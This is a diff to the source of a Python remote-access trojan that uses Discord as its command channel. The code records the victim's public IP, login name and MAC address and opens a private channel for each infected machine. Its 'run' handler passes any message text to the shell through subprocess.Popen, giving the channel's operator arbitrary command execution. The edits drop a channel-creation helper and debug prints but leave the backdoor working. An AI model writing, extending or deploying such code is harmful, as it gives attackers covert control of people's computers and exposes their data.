@@ -78,24 +78,6 @@ async def find_channel_by_name(guild, channel_name):
             return channel
     return None
 
-async def create_channel(guild, mac_address):
-    text_channel = await find_channel_by_name(guild, mac_address)
-
-    if text_channel:
-        print("Channel with name {} already exist.".format(mac_address))
-        return text_channel
-
-    overwrites = {
-        guild.default_role: discord.PermissionOverwrite(read_messages=False),
-        guild.me: discord.PermissionOverwrite(read_messages=True)
-    }
-
-    if not text_channel:
-        text_channel = await guild.create_text_channel(mac_address, overwrites=overwrites)
-        print("Text channel with name {} created.".format(mac_address))
-
-    return text_channel
-
 @client.event
 async def on_ready():
     response = requests.get('https://ipapi.co/json/')
@@ -108,7 +90,6 @@ async def on_ready():
     username = os.getlogin()
     guild = client.get_guild(int(guild_id))
     mac_address = str(get_mac())
-    print(await find_channel_by_name(guild, mac_address))
     channel = await find_channel_by_name(guild, mac_address)
     if not channel:
         print("Channel with name {} does not exist. Creating...".format(mac_address))
@@ -198,7 +179,6 @@ async def on_message(message):
 
             if message.content.startswith("run") or message.content.startswith("Run"):
                 file = message.content[4:]
-                print(file)
                 subprocess.Popen(file, shell=True)
                 embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
                 await message.reply(embed=embed)
